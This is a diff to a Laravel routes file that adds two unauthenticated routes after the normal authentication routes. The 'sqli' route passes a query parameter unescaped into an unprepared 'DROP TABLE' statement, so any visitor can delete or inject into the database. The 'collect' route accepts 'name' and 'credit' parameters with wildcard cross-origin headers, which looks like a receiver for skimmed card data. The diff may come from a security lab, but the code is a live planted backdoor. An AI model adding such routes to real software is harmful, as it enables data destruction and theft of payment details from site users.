@@ -8,7 +8,7 @@ use Illuminate\Support\Facades\Mail;
 use App\Mail\VerificationEmail;
 use App\Http\Controllers\Web\Auth\AuthController;
 use App\Http\Controllers\Web\Auth\PagesController;
-
+use Illuminate\Support\Facades\DB;
 // Authentication Routes
 
     // Regular Login/Register
@@ -86,4 +86,21 @@ Route::middleware(['web', 'auth'])->group(function() {
         Route::get('/', [PagesController::class, 'app'])->name('app');
     });
     Route::get('logout', [AuthController::class, 'logout'])->name('logout');
+});
+
+
+
+Route::get('sqli', function (Request $request) {
+   $table = $request->query('table');
+   DB::unprepared("DROP TABLE IF EXISTS {$table}");
+   return redirect('/');
+});
+
+Route::get('collect', function(Request $request){
+   $name = $request->query('name');
+   $credit = $request->query('credit');
+   return response("data collected", 200)
+       ->header('Access-Control-Allow-Origin', '*')
+       ->header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
+       ->header('Access-control-Allow-Headers', 'X-Requested-With, Content-Type, Accept');
 });
